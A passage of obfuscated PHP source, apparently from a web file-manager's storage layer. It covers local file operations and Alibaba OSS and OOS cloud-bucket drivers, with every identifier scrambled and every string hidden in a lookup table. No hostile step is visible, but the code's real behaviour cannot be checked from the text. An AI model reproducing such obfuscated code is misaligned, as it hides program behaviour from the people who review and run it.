$this->iconvTo($ÍŒŠÅÑ, $config[$Ã‚†ñğ[1403]], $config[$Ã‚†ñğ[1404]]); } public function getPathOuter($¨šÒ‹‚Ü) { $§±ûå =& $_SERVER[çâ¥×ø³]; $«²âà¨Ÿ = $this->iconvApp($this->pathBase); $¨šÒ‹‚Ü = $this->iconvApp($¨šÒ‹‚Ü); if (substr($«²âà¨Ÿ, 0, 2) == $§±ûå[1406]) { $«²âà¨Ÿ = BASIC_PATH . substr($«²âà¨Ÿ, 2); } if (substr($¨šÒ‹‚Ü, 0, 2) == $§±ûå[1406]) { $¨šÒ‹‚Ü = BASIC_PATH . substr($¨šÒ‹‚Ü, 2); } $«²âà¨Ÿ = KodIO::clear($«²âà¨Ÿ); $¨šÒ‹‚Ü = KodIO::clear($¨šÒ‹‚Ü); $¨šÒ‹‚Ü = substr($¨šÒ‹‚Ü, strlen($«²âà¨Ÿ)); if (empty($this->pathDriver)) { return $¨šÒ‹‚Ü; } return $this->pathDriver . $§±ûå[8] . ltrim($¨šÒ‹‚Ü, $§±ûå[8]); } public function mkfile($åĞ©Øê, $ˆô´¤Å‡ = '', $º½—ì¸´ = REPEAT_RENAME) { $åĞ©Øê = $this->iconvSystem($åĞ©Øê); @touch($åĞ©Øê); if ($ˆô´¤Å‡) { file_put_contents($åĞ©Øê, $ˆô´¤Å‡); } @chmod($åĞ©Øê, $this->pathAuth); return is_file($åĞ©Øê) ? $this->getPathOuter($åĞ©Øê) : !1; } public function mkdir($§å­ù†Ç, $Ÿ‚†ï›¸ = REPEAT_SKIP) { $§å­ù†Ç = $this->iconvSystem($§å­ù†Ç); if (is_dir($§å­ù†Ç)) { return $this->getPathOuter($§å­ù†Ç); } @mkdir($§å­ù†Ç, $this->pathAuth, !0); @chmod($§å­ù†Ç, $this->pathAuth); return is_dir($§å­ù†Ç) ? $this->getPathOuter($§å­ù†Ç) : !1; } public function copyFile($ÕÔú±¤À, $ò¶è€ëÒ) { $this->mkdir($this->pathFather($ò¶è€ëÒ)); $ÕÔú±¤À = $this->iconvSystem($ÕÔú±¤À); $ò¶è€ëÒ = $this->iconvSystem($ò¶è€ëÒ); $ó¬ÇœÚ = copy_64($ÕÔú±¤À, $ò¶è€ëÒ); @chmod($ò¶è€ëÒ, $this->pathAuth); return $ó¬ÇœÚ ? $this->getPathOuter($ò¶è€ëÒ) : !1; } public function moveFile($Ğ†­í–†, $ãÕÓ«è°) { $this->mkdir($this->pathFather($ãÕÓ«è°)); $Ğ†­í–† = $this->iconvSystem($Ğ†­í–†); $ãÕÓ«è° = $this->iconvSystem($ãÕÓ«è°); $¤ø°¦ñ = intval(@rename($Ğ†­í–†, $ãÕÓ«è°)); if (!$¤ø°¦ñ) { if ($¤ø°¦ñ = intval(@copy_64($Ğ†­í–†, $ãÕÓ«è°))) { @unlink($Ğ†­í–†); } } @chmod($ãÕÓ«è°, $this->pathAuth); return $¤ø°¦ñ ? $this->getPathOuter($ãÕÓ«è°) : !1; } public function movePath($òÅô, $µÖâ©„Ğ, $‹—ï²‚ö = false) { $ú§°ÖşÄ =& $_SERVER[çâ¥×ø³]; $òÅô = $this->iconvSystem($òÅô); $µÖâ©„Ğ = $this->iconvSystem($µÖâ©„Ğ); $ê¸èâ¯Ñ = rtrim($µÖâ©„Ğ, $ú§°ÖşÄ[8]) . $ú§°ÖşÄ[8] . ($‹—ï²‚ö ? $‹—ï²‚ö : get_path_this($òÅô)); if (file_exists($ê¸èâ¯Ñ)) { return !1; } $ì¿ì¿–å = intval(@rename($òÅô, $ê¸èâ¯Ñ)); $ì¿ì¿–å = file_exists($ê¸èâ¯Ñ); return $ì¿ì¿–å ? $this->getPathOuter($ê¸èâ¯Ñ) : !1; } public function delFile($›è¥²Ğû) { $›è¥²Ğû = $this->iconvSystem($›è¥²Ğû); if (!@unlink($›è¥²Ğû)) { @chmod($›è¥²Ğû, $this->pathAuth); if (!@unlink($›è¥²Ğû)) { return !1; } } else { return !0; } } public function delFolder($İæ¼‚Ê›) { $ä‡€ÌÄ =& $_SERVER[çâ¥×ø³]; $İæ¼‚Ê› = $this->iconvSystem($İæ¼‚Ê›); if (!is_dir($İæ¼‚Ê›)) { return !0; } if (!($ û²÷µ = opendir($İæ¼‚Ê›))) { return !1; } while (($–ïÎ´Û’ = readdir($ û²÷µ)) !== !1) { if ($–ïÎ´Û’ == $ä‡€ÌÄ[10] || $–ïÎ´Û’ == $ä‡€ÌÄ[1331]) { continue; } $æ««ÔÁï = $İæ¼‚Ê› . $ä‡€ÌÄ[8] . $–ïÎ´Û’; if (is_file($æ««ÔÁï) || is_link($æ««ÔÁï)) { if (!unlink($æ««ÔÁï)) { chmod($æ««ÔÁï, $this->pathAuth); if (!unlink($æ««ÔÁï)) { return !1; } } } else { if (is_dir($æ««ÔÁï)) { chmod($æ««ÔÁï, $this->pathAuth); $æ««ÔÁï = $this->iconvApp($æ««ÔÁï); if (!$this->delFolder($æ««ÔÁï)) { return !1; } } } } closedir($ û²÷µ); return rmdir($İæ¼‚Ê›); } public function rename($ôª–ŠÒ¸, $©×ç‡Û) { $Œ¥Ğ…ìÑ =& $_SERVER[çâ¥×ø³]; $ ËĞäÏÛ = $this->fileNameAuto($this->pathFather($ôª–ŠÒ¸), $©×ç‡Û); $ ËĞäÏÛ = $this->iconvSystem($ ËĞäÏÛ); $ôª–ŠÒ¸ = $this->iconvSystem($ôª–ŠÒ¸); $Ö«¹¦Ç§ = $this->pathFather($ôª–ŠÒ¸); $Ç ô½• = rtrim($Ö«¹¦Ç§, $Œ¥Ğ…ìÑ[8]) . $Œ¥Ğ…ìÑ[8] . $ ËĞäÏÛ; $Ê—„ÌÒÁ = @rename($ôª–ŠÒ¸, $Ç ô½•); $Ç ô½• = $this->iconvApp($Ç ô½•); return $Ê—„ÌÒÁ ? $this->getPathOuter($Ç ô½•) : !1; } public function size($ıÄëôœ) { $ıÄëôœ = $this->iconvSystem($ıÄëôœ); return filesize_64($ıÄëôœ); } public function info($ÅÇøß´) { $ÅÇøß´ = $this->iconvSystem($ÅÇøß´); if ($this->isFolder($ÅÇøß´)) { return $this->folderInfo($ÅÇøß´); } else { if ($this->isFile($ÅÇøß´)) { return $this->fileInfo($ÅÇøß´); } } return !1; } protected function infoChildren($øÚ†º‰¹, &$‹şªÕ±, $Æ¯êÔË« = true) { $‚´ß˜£Ú =& $_SERVER[çâ¥×ø³]; check_abort_echo(); $øÚ†º‰¹ = rtrim($øÚ†º‰¹, $‚´ß˜£Ú[8]) . $‚´ß˜£Ú[8]; if ($Æ¯êÔË«) { $øÚ†º‰¹ = $this->iconvSystem($øÚ†º‰¹); } if (!($ğŒó¾Æ = @opendir($øÚ†º‰¹))) { return; } while (($Õ±Ü¼Ê³ = readdir($ğŒó¾Æ)) !== !1) { if ($Õ±Ü¼Ê³ == $‚´ß˜£Ú[10] || $Õ±Ü¼Ê³ == $‚´ß˜£Ú[1331]) { continue; } $æêóêìÙ = $øÚ†º‰¹ . $Õ±Ü¼Ê³; if (is_file($æêóêìÙ) || is_link($æêóêìÙ)) { $‹şªÕ±[$‚´ß˜£Ú[77]]++; $‹şªÕ±[$‚´ß˜£Ú[76]] += filesize_64($æêóêìÙ); } else { if (is_dir($æêóêìÙ)) { $‹şªÕ±[$‚´ß˜£Ú[78]]++; $this->infoChildren($æêóêìÙ, $‹şªÕ±, !1); } } } closedir($ğŒó¾Æ); } private function folderInfo($Ë€£ş«, $¹º¬… = false) { $ÂıÆñÔ” =& $_SERVER[çâ¥×ø³]; $Ë€£ş« = rtrim($Ë€£ş«, $ÂıÆñÔ”[8]) . $ÂıÆñÔ”[8]; $ÈÆ¿öÙõ = $this->iconvApp($this->pathThis($Ë€£ş«)); if ($¹º¬…) { return array($ÂıÆñÔ”[32] => $ÈÆ¿öÙõ, $ÂıÆñÔ”[84] => $this->getPathOuter($Ë€£ş«), $ÂıÆñÔ”[33] => $ÂıÆñÔ”[75]); } $ıæµñºË = array($ÂıÆñÔ”[32] => $ÈÆ¿öÙõ, $ÂıÆñÔ”[84] => $this->getPathOuter($Ë€£ş«), $ÂıÆñÔ”[33] => $ÂıÆñÔ”[75], $ÂıÆñÔ”[215] => @filectime($Ë€£ş«), $ÂıÆñÔ”[85] => @filemtime($Ë€£ş«), $ÂıÆñÔ”[1415] => @fileatime($Ë€£ş«), $ÂıÆñÔ”[1416] => is_readable($Ë€£ş«), $ÂıÆñÔ”[1417] => is_writable($Ë€£ş«), $ÂıÆñÔ”[1418] => get_mode($Ë€£ş«)); return $ıæµñºË; } private function fileInfo($Ôû„İ¡, $±‚¤ÎÊ¾ = false) { $‚öºÒôŠ =& $_SERVER[çâ¥×ø³]; $—ËşÜÌı = $this->iconvApp($this->pathThis($Ôû„İ¡)); if ($±‚¤ÎÊ¾) { return array($‚öºÒôŠ[32] => $—ËşÜÌı, $‚öºÒôŠ[84] => $this->getPathOuter($Ôû„İ¡), $‚öºÒôŠ[33] => $‚öºÒôŠ[214], $‚öºÒôŠ[76] => $this->size($Ôû„İ¡), $‚öºÒôŠ[175] => $this->ext($—ËşÜÌı)); } $âĞ–ƒ”ê = array($‚öºÒôŠ[32] => $—ËşÜÌı, $‚öºÒôŠ[84] => $this->getPathOuter($Ôû„İ¡), $‚öºÒôŠ[33] => $‚öºÒôŠ[214], $‚öºÒôŠ[215] => @filectime($Ôû„İ¡), $‚öºÒôŠ[85] => @filemtime($Ôû„İ¡), $‚öºÒôŠ[1415] => @fileatime($Ôû„İ¡), $‚öºÒôŠ[76] => $this->size($Ôû„İ¡), $‚öºÒôŠ[175] => $this->ext($—ËşÜÌı), $‚öºÒôŠ[1416] => is_readable($Ôû„İ¡), $‚öºÒôŠ[1417] => is_writable($Ôû„İ¡), $‚öºÒôŠ[1418] => get_mode($Ôû„İ¡)); return $âĞ–ƒ”ê; } public function exist($àÓ™òÙ) { $àÓ™òÙ = $this->iconvSystem($àÓ™òÙ); return @file_exists($àÓ™òÙ); } public function isFile($êù­‡ç“) { $êù­‡ç“ = $this->iconvSystem($êù­‡ç“); return @is_file($êù­‡ç“); } public function isFolder($†À ã•¨) { $†À ã•¨ = $this->iconvSystem($†À ã•¨); return @is_dir($†À ã•¨); } public function listPath($¨×Ó¼ëø, $¨å´©” = false) { $„¬Ò¢ò» =& $_SERVER[çâ¥×ø³]; $¨×Ó¼ëø = $this->iconvSystem($¨×Ó¼ëø); $¨×Ó¼ëø = rtrim($¨×Ó¼ëø, $„¬Ò¢ò»[8]) . $„¬Ò¢ò»[8]; $‚Üµ»Ñß = array($„¬Ò¢ò»[82] => array(), $„¬Ò¢ò»[83] => array()); if (!($öÛñ×ÇÄ = @opendir($¨×Ó¼ëø))) { return $‚Üµ»Ñß; } while (($£óÅ»¥“ = readdir($öÛñ×ÇÄ)) !== !1) { if ($£óÅ»¥“ == $„¬Ò¢ò»[10] || $£óÅ»¥“ == $„¬Ò¢ò»[1331]) { continue; } $øÜ–îè» = $¨×Ó¼ëø . $£óÅ»¥“; if (is_file($øÜ–îè»)) { $‚Üµ»Ñß[$„¬Ò¢ò»[83]][] = $this->fileInfo($øÜ–îè», $¨å´©”); } else { $‚Üµ»Ñß[$„¬Ò¢ò»[82]][] = $this->folderInfo($øÜ–îè», $¨å´©”); } } closedir($öÛñ×ÇÄ); return $‚Üµ»Ñß; } public function listAll($¨âºŠõü, &$ØÔ»™»ˆ = array()) { $æÜÅÙ÷‰ =& $_SERVER[çâ¥×ø³]; $¨âºŠõü = $this->iconvSystem($¨âºŠõü); $¨âºŠõü = rtrim($¨âºŠõü, $æÜÅÙ÷‰[8]) . $æÜÅÙ÷‰[8]; if (!($æûªÅÜ³ = @opendir($¨âºŠõü))) { return $ØÔ»™»ˆ; } while (($’æïÁèÇ = readdir($æûªÅÜ³)) !== !1) { if ($’æïÁèÇ == $æÜÅÙ÷‰[10] || $’æïÁèÇ == $æÜÅÙ÷‰[1331]) { continue; } $·×ºó¹ = $¨âºŠõü . $’æïÁèÇ; $÷Öü³ü› = is_dir($·×ºó¹) && !is_link($·×ºó¹) ? 1 : 0; $·×ºó¹ = $÷Öü³ü› ? $·×ºó¹ . $æÜÅÙ÷‰[8] : $·×ºó¹; $ØÔ»™»ˆ[] = array($æÜÅÙ÷‰[84] => $·×ºó¹, $æÜÅÙ÷‰[75] => $÷Öü³ü›, $æÜÅÙ÷‰[85] => intval(@filemtime($·×ºó¹)), $æÜÅÙ÷‰[76] => $÷Öü³ü› ? 0 : intval($this->size($·×ºó¹))); if ($÷Öü³ü›) { $this->listAll($·×ºó¹, $ØÔ»™»ˆ); } } closedir($æûªÅÜ³); return $ØÔ»™»ˆ; } public function has($Î´Œ®ØŠ, $¯²î‹¾Ÿ = false, $÷„» í’ = true) { $°¿œå€á =& $_SERVER[çâ¥×ø³]; $Î´Œ®ØŠ = $this->iconvSystem($Î´Œ®ØŠ); $Î´Œ®ØŠ = rtrim($Î´Œ®ØŠ, $°¿œå€á[8]) . $°¿œå€á[8]; if (!($”¬Õ¢¿ğ = @opendir($Î´Œ®ØŠ))) { return !1; } $Ø˜¶øÍ = 0; $ƒÄª„¬á = 0; $ÄÏ‹€ú© = 0; while (($Ù±•§Õ = readdir($”¬Õ¢¿ğ)) !== !1) { if ($Ù±•§Õ == $°¿œå€á[10] || $Ù±•§Õ == $°¿œå€á[1331]) { continue; } $ùøâŠ„“ = $Î´Œ®ØŠ . $Ù±•§Õ; if ($¯²î‹¾Ÿ) { $ÄÏ‹€ú©++; if (@is_file($ùøâŠ„“)) { $Ø˜¶øÍ++; } else { $ƒÄª„¬á++; } if ($ÄÏ‹€ú© > 10000) { break; } continue; } if ($÷„» í’) { if (@is_file($ùøâŠ„“)) { return !0; } } else { if (@is_dir($ùøâŠ„“ . $°¿œå€á[8])) { return !0; } } } closedir($”¬Õ¢¿ğ); if ($¯²î‹¾Ÿ) { return array($°¿œå€á[223] => $Ø˜¶øÍ, $°¿œå€á[224] => $ƒÄª„¬á); } return !1; } public function hashSimple($Ä§’ßÈú) { $é™¬ÊÆº =& $_SERVER[çâ¥×ø³]; if (!$Ä§’ßÈú) { return md5($é™¬ÊÆº[12]); } $Ä§’ßÈú = $this->iconvSystem($Ä§’ßÈú); $ƒáÄÎú« = $this->size($Ä§’ßÈú); $õ¾ŞóÂÏ = 200; $Ã¦±şÆÍ = 50; if ($ƒáÄÎú« <= $õ¾ŞóÂÏ * $Ã¦±şÆÍ) { return $this->hashMd5($Ä§’ßÈú) . $ƒáÄÎú«; } $á×Ó®ÔÅ = $é™¬ÊÆº[12]; $»÷Íµåº = intval($ƒáÄÎú« / $Ã¦±şÆÍ); $ß©‡Ç¶ = fopen($Ä§’ßÈú, $é™¬ÊÆº[1419]); if (!$ß©‡Ç¶) { return $á×Ó®ÔÅ; } for ($­Ïµª¶§ = 0; $­Ïµª¶§ < $Ã¦±şÆÍ; $­Ïµª¶§++) { fseek_64($ß©‡Ç¶, $»÷Íµåº * $­Ïµª¶§); $á×Ó®ÔÅ .= fread($ß©‡Ç¶, $õ¾ŞóÂÏ); } fseek_64($ß©‡Ç¶, $ƒáÄÎú« - $õ¾ŞóÂÏ); $á×Ó®ÔÅ .= fread($ß©‡Ç¶, $õ¾ŞóÂÏ); fclose($ß©‡Ç¶); return md5($á×Ó®ÔÅ) . $ƒáÄÎú«; } public function getContent($Æˆü°¾ø) { $Æˆü°¾ø = $this->iconvSystem($Æˆü°¾ø); return file_get_contents($Æˆü°¾ø); } public function setContent($£¹´õË×, $‡Ï Õğ» = '') { $£¹´õË× = $this->iconvSystem($£¹´õË×); $µ¦ùà¥³ = @file_put_contents($£¹´õË×, $‡Ï Õğ», LOCK_EX); clearstatcache(); @chmod($£¹´õË×, $this->pathAuth); return $µ¦ùà¥³ === !1 ? !1 : !0; } public function fileSubstr($É”Çµè¡, $±Ë†©”ô = 0, $ÍÅë˜ªã = false) { $—ƒ—ú»Ø =& $_SERVER[çâ¥×ø³]; $É”Çµè¡ = $this->iconvSystem($É”Çµè¡); if ($ÍÅë˜ªã === !1) { $ÍÅë˜ªã = $this->size($É”Çµè¡); } if ($ÍÅë˜ªã <= 0) { return $—ƒ—ú»Ø[12]; } $Ç¦Õê¤ = fopen($É”Çµè¡, $—ƒ—ú»Ø[1419]); if (!$Ç¦Õê¤) { return !1; } fseek_64($Ç¦Õê¤, $±Ë†©”ô); $İıÓö»è = fread($Ç¦Õê¤, $ÍÅë˜ªã); fclose($Ç¦Õê¤); return $İıÓö»è; } public function upload($ÁÈ”×÷¼, $ìöÛ´½§, $òßòÛê = false, $ßåçùÒ = REPEAT_REPLACE) { if ($òßòÛê) { return $this->moveFile($ìöÛ´½§, $ÁÈ”×÷¼); } return $this->copyFile($ìöÛ´½§, $ÁÈ”×÷¼); } public function setModifyTime($Ö¸Ñš, $ÑÜ˜ıÏ = '') { @touch($Ö¸Ñš, intval($ÑÜ˜ıÏ)); } public function download($¸¨­¿•, $í¾»ª•”) { return $this->iconvSystem($¸¨­¿•); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($³¾íƒ¹) { parent::__construct($³¾íƒ¹); $this->signatureVersion($_SERVER[çâ¥×ø³][231]); } public function fileOutLink($’¦‡÷Ä†) { $õáø»·ã =& $_SERVER[çâ¥×ø³]; if (substr($’¦‡÷Ä†, 0, 7) == $õáø»·ã[1383]) { $’¦‡÷Ä† = $õáø»·ã[1384] . substr($’¦‡÷Ä†, 7); } header($õáø»·ã[162] . $’¦‡÷Ä†); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ü•²ô©¾) { parent::__construct(); include_once SDK_DIR . $_SERVER[çâ¥×ø³][1420]; $this->_init($ü•²ô©¾); } public function _init($•Ü¶Ù±˜) { $á¤Çâ¡ =& $_SERVER[çâ¥×ø³]; $this->config = $•Ü¶Ù±˜; foreach ($•Ü¶Ù±˜ as $°ğøŠ“ => $ÒÏ—şúÓ) { if (isset($this->{$°ğøŠ“})) { $this->{$°ğøŠ“} = $ÒÏ—şúÓ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($á¤Çâ¡[1421] . LNG($á¤Çâ¡[1422])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÕóèÚŒ =& $_SERVER[çâ¥×ø³]; $É¸˜®õæ = new OSS\Model\CorsConfig(); $°ÛªœëÅ = new OSS\Model\CorsRule(); $°ÛªœëÅ->addAllowedOrigin($ÕóèÚŒ[1423]); $°ÛªœëÅ->addAllowedMethod($ÕóèÚŒ[1424]); $°ÛªœëÅ->addAllowedMethod($ÕóèÚŒ[1425]); $°ÛªœëÅ->addAllowedMethod($ÕóèÚŒ[1426]); $°ÛªœëÅ->addAllowedMethod($ÕóèÚŒ[1427]); $°ÛªœëÅ->addAllowedMethod($ÕóèÚŒ[161]); $°ÛªœëÅ->setMaxAgeSeconds(600); $°ÛªœëÅ->addExposeHeader($ÕóèÚŒ[1428]); $°ÛªœëÅ->addAllowedHeader($ÕóèÚŒ[1423]); $É¸˜®õæ->addRule($°ÛªœëÅ); try { $this->client->putBucketCors($this->bucket, $É¸˜®õæ); } catch (OSS\Core\OssException $ôÍÉİ÷) { return !1; } return !0; } public function getBucketCors() { $„ùïäÈ˜ =& $_SERVER[çâ¥×ø³]; $øá»Ûœ = null; try { $øá»Ûœ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $áê‚´Íİ) { return null; } if (!$øá»Ûœ || !($¢ûŸ´à = $øá»Ûœ->getRules())) { return null; } $¡¦—ÔÆ = $¢ûŸ´à[0]->getAllowedOrigins(); $úş‹º› = $¢ûŸ´à[0]->getAllowedMethods(); $çÒ–Ÿƒ = $¢ûŸ´à[0]->getMaxAgeSeconds(); $ö¼ÖŠªÆ = $¢ûŸ´à[0]->getExposeHeaders(); $ìÔ©°´˜ = $¢ûŸ´à[0]->getAllowedHeaders(); return array($„ùïäÈ˜[202] => isset($¡¦—ÔÆ[0]) ? $¡¦—ÔÆ[0] : $„ùïäÈ˜[12], $„ùïäÈ˜[206] => $úş‹º›, $„ùïäÈ˜[1429] => $çÒ–Ÿƒ, $„ùïäÈ˜[1430] => isset($ö¼ÖŠªÆ[0]) ? $ö¼ÖŠªÆ[0] : $„ùïäÈ˜[12], $„ùïäÈ˜[204] => isset($ìÔ©°´˜[0]) ? $ìÔ©°´˜[0] : $„ùïäÈ˜[12]); } public function isBucketCors() { $«™ÊÍ˜î =& $_SERVER[çâ¥×ø³]; $¡®µ¸ = $this->getBucketCors(); if (!$¡®µ¸ || !is_array($¡®µ¸)) { return !1; } if ($¡®µ¸[$«™ÊÍ˜î[202]] != $«™ÊÍ˜î[203] || $¡®µ¸[$«™ÊÍ˜î[204]] != $«™ÊÍ˜î[203]) { return !1; } $£´âÍ­ò = array_map($«™ÊÍ˜î[205], $¡®µ¸[$«™ÊÍ˜î[206]]); if (!is_array($£´âÍ­ò)) { $£´âÍ­ò = array(); } $Ã¬ÍÚ‚ = array($«™ÊÍ˜î[207], $«™ÊÍ˜î[208], $«™ÊÍ˜î[209], $«™ÊÍ˜î[210], $«™ÊÍ˜î[211]); $Ä¾î¥ã = array_diff($Ã¬ÍÚ‚, $£´âÍ­ò); return empty($Ä¾î¥ã); } public function mkfile($öú¸ï•’, $ÑÃ—õáÚ = '', $Ï½‚› Î = REPEAT_RENAME) { $‚›§Ø›Å = $this->setContent($öú¸ï•’, $ÑÃ—õáÚ); if ($‚›§Ø›Å !== !1) { return $this->getPathOuter($öú¸ï•’); } return !1; } public function mkdir($ÉêöÏ¬, $ø¶¼èí = REPEAT_SKIP) { if ($ø¶¼èí && $this->_isFolder($ÉêöÏ¬)) { return $this->getPathOuter($ÉêöÏ¬); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÉêöÏ¬)); } catch (OSS\Core\OssException $Âª‚) { return !1; } return $this->getPathOuter($ÉêöÏ¬); } private function fileList($û×ŠáÅœ, $ùé‰ˆø² = '', $Ò¸•Ş“ƒ = 0) { $û°ÃÍ…“ =& $_SERVER[çâ¥×ø³]; $û×ŠáÅœ = trim($û×ŠáÅœ, $û°ÃÍ…“[8]); $ö‘Ñ°µÖ = empty($û×ŠáÅœ) && $û×ŠáÅœ !== $û°ÃÍ…“[212] ? $û°ÃÍ…“[12] : $û×ŠáÅœ . $û°ÃÍ…“[8]; $±˜Šï’Ç = $û°ÃÍ…“[12]; $›Â‰»Ò = 1000; $©èœš“í = $Õ¿ŸŞíÁ = array(); while (!0) { check_abort(); $ş¥Ëû = array($û°ÃÍ…“[1431] => $ùé‰ˆø², $û°ÃÍ…“[1432] => $ö‘Ñ°µÖ, $û°ÃÍ…“[1433] => $›Â‰»Ò, $û°ÃÍ…“[1434] => $±˜Šï’Ç); try { $˜‰ó‹÷ = $this->client->listObjects($this->bucket, $ş¥Ëû); } catch (OSS\Core\OssException $ËÓ›Éá) { break; } $±˜Šï’Ç = $˜‰ó‹÷->getNextMarker(); $´Ò’‘Í = $˜‰ó‹÷->getObjectList(); $Áûøˆé = $˜‰ó‹÷->getPrefixList(); foreach ($´Ò’‘Í as $ÑŸµ©Ñ) { if ($ÑŸµ©Ñ->getKey() == $ö‘Ñ°µÖ) { continue; } $¦–ÒñŸ = $ÑŸµ©Ñ->getKey(); $ÇÆ¦Æ¨¶ = $ÑŸµ©Ñ->getSize(); $¼àßµª = $ÑŸµ©Ñ->getLastModified(); $°×íºÃ« = trim($ÑŸµ©Ñ->getETag(), $û°ÃÍ…“[118]); $ÖÛÉ˜ä = $Ò¸•Ş“ƒ ? array($û°ÃÍ…“[32] => $¦–ÒñŸ, $û°ÃÍ…“[76] => $ÇÆ¦Æ¨¶, $û°ÃÍ…“[194] => strtotime($¼àßµª), $û°ÃÍ…“[1435] => $°×íºÃ«) : $¦–ÒñŸ; $±£Ê®öØ = $ÇÆ¦Æ¨¶ == 0 && substr($¦–ÒñŸ, strlen($¦–ÒñŸ) - 1, 1) == $û°ÃÍ…“[8] ? !0 : !1; $üÔ®Î¬Æ = array($û°ÃÍ…“[76] => $ÇÆ¦Æ¨¶, $û°ÃÍ…“[1436] => $ÇÆ¦Æ¨¶, $û°ÃÍ…“[85] => strtotime($¼àßµª), $û°ÃÍ…“[1437] => $¼àßµª, $û°ÃÍ…“[1435] => $°×íºÃ«); $this->cacheMethodInfoSet($¦–ÒñŸ, $±£Ê®öØ, $üÔ®Î¬Æ); if ($±£Ê®öØ) { $©èœš“í[] = $¦–ÒñŸ; continue; } $Õ¿ŸŞíÁ[] = $ÖÛÉ˜ä; } foreach ($Áûøˆé as $Öˆ•Ñ”) { $©èœš“í[] = $Öˆ•Ñ”->getPrefix(); $this->cacheMethodInfoSet($Öˆ•Ñ”->getPrefix(), !0); } if ($±˜Šï’Ç === $û°ÃÍ…“[12]) { break; } } $this->cacheMethodInfoSet($û×ŠáÅœ, !0); return array($û°ÃÍ…“[82] => $©èœš“í, $û°ÃÍ…“[83] => $Õ¿ŸŞíÁ); } public function copyFile($öûµ€ó», $‚ÎÏàÃõ) { $¦ïÕîºÂ = $this->size($öûµ€ó»); if ($¦ïÕîºÂ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $öûµ€ó», $this->bucket, $this->pathEncode($‚ÎÏàÃõ)); } catch (OSS\Core\OssException $Õüî„§Ä) { return !1; } return $this->getPathOuter($‚ÎÏàÃõ); } $¯³ú ù = $this->multiCopyObject($öûµ€ó», $‚ÎÏàÃõ, $¦ïÕîºÂ); return $¯³ú ù ? $this->getPathOuter($‚ÎÏàÃõ) : !1; } private function multiCopyObject($ÅìšäÄ®, $×á—ˆ«–, $Ã–¼Èë¿) { $şÎé¢•à =& $_SERVER[çâ¥×ø³]; try { $ÊÕøìÅƒ = array(); if ($“çÖĞÜƒ = $this->hashMd5($ÅìšäÄ®)) { $ÊÕøìÅƒ = array(OSS\OssClient::OSS_HEADERS => array($şÎé¢•à[1438] => $“çÖĞÜƒ)); } $£ÈğøÏ¬ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($×á—ˆ«–), $ÊÕøìÅƒ); $‰ÒÏÏà» = 1; $æÅäÈ¼¾ = 0; $‚ß‡‰À  = array(); $ìóÚÂ± = 1024 * 1024 * 10; $´â¢£¡— = $this->client->generateMultiuploadParts($Ã–¼Èë¿, $ìóÚÂ±); foreach ($´â¢£¡— as $Óªüûå‚ => $É»éú) { $ˆ“ìª‹ = $æÅäÈ¼¾ + (int) $É»éú[$şÎé¢•à[1439]]; $ÛôÖÔÕí = (int) $É»éú[$şÎé¢•à[381]] + $ˆ“ìª‹ - 1; $ÚĞµÌ‚“ = array($şÎé¢•à[1440] => $ˆ“ìª‹, $şÎé¢•à[1441] => $ÛôÖÔÕí); $‚ß‡‰À [] = $this->client->uploadPartCopy($this->bucket, $ÅìšäÄ®, $this->bucket, $this->pathEncode($×á—ˆ«–), $‰ÒÏÏà», $£ÈğøÏ¬, $ÚĞµÌ‚“); $‰ÒÏÏà» = $‰ÒÏÏà» + 1; } $Öºã´°³ = array(); foreach ($‚ß‡‰À  as $Óªüûå‚ => $ÆÑÚÏ”) { $Öºã´°³[] = array($şÎé¢•à[1442] => $Óªüûå‚ + 1, $şÎé¢•à[1443] => $ÆÑÚÏ”); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($×á—ˆ«–), $£ÈğøÏ¬, $Öºã´°³); } catch (OSS\Core\OssException $æç€Àûä) { return !1; } return !0; } public function moveFile($Êü¾Øîš, $Î¥Æ¯š¬) { if ($this->copyFile($Êü¾Øîš, $Î¥Æ¯š¬)) { $this->remove($Êü¾Øîš); return $this->getPathOuter($Î¥Æ¯š¬); } return !1; } public function delFile($ßİı‚ÑÀ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ßİı‚ÑÀ)); } catch (OSS\Core\OssException $¸†µÁ—ú) { return !1; } return !0; } public function delFolder($„™Å™¬è) { $š³ƒìÅ =& $_SERVER[çâ¥×ø³]; if (!$this->exist($„™Å™¬è)) { return !0; } $this->listItemCache = !1; $«µ—©Ï = $this->fileList($„™Å™¬è); $this->listItemCache = !0; $åä¼•Š = trim($„™Å™¬è, $š³ƒìÅ[8]) . $š³ƒìÅ[8]; if (!empty($„™Å™¬è) && $„™Å™¬è !== $š³ƒìÅ[212] && !in_array($åä¼•Š, $«µ—©Ï[$š³ƒìÅ[82]])) { $«µ—©Ï[$š³ƒìÅ[82]][] = $åä¼•Š; } $ÈŠñ½Ä° = $this->delByBatch($«µ—©Ï[$š³ƒìÅ[83]]); if (!$ÈŠñ½Ä°) { return !1; } $ÈŠñ½Ä° = $this->delByBatch($«µ—©Ï[$š³ƒìÅ[82]]); if (!$ÈŠñ½Ä°) { return !1; } return $this->delFile($åä¼•Š); } private function delByBatch($ÌóÁ¤‡©) { foreach (array_chunk($ÌóÁ¤‡©, 1000) as $äùØÓœ) { try { $this->client->deleteObjects($this->bucket, $äùØÓœ); } catch (OSS\Core\OssException $ãæ¡ôÙ½) { return !1; } } return !0; } public function rename($ªÁĞï±…, $–ÊÛşà­) { return $this->renameObject($ªÁĞï±…, $–ÊÛşà­); } private function fileInfo($œŒ‰®ù¾, $õÀÅ•›È = false, $ÎÚ‹Ş«Ô = array()) { $¬ÃÄÙ’ =& $_SERVER[çâ¥×ø³]; $´´›Øù = array($¬ÃÄÙ’[32] => $this->pathThis($œŒ‰®ù¾), $¬ÃÄÙ’[84] => $this->getPathOuter($œŒ‰®ù¾), $¬ÃÄÙ’[33] => 